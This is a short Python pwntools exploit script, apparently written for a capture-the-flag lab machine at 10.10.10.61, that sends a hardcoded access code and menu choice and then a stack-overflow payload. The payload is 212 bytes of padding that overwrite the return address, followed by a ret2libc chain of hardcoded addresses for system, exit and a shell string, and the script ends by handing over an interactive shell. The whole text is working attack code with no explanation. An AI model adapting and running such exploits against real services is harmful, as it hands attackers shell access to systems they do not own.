from pwn import *

context(os="linux", arch="i386")
HOST, PORT = "10.10.10.61", 32812

# EIP Overwrite at 212
junk = "\x90" * 212

ret2libc = p32(0xf7e4c060) # System address
ret2libc += p32(0xf7e3faf0) # Exit address
ret2libc += p32(0xf7f6ddd5) # sh address

payload = junk + ret2libc

r = remote(HOST, PORT)

r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")

r.recvuntil("Waiting for input:")
r.sendline("4")

r.recvuntil("Enter Security Override:")
r.sendline(payload)

r.interactive()
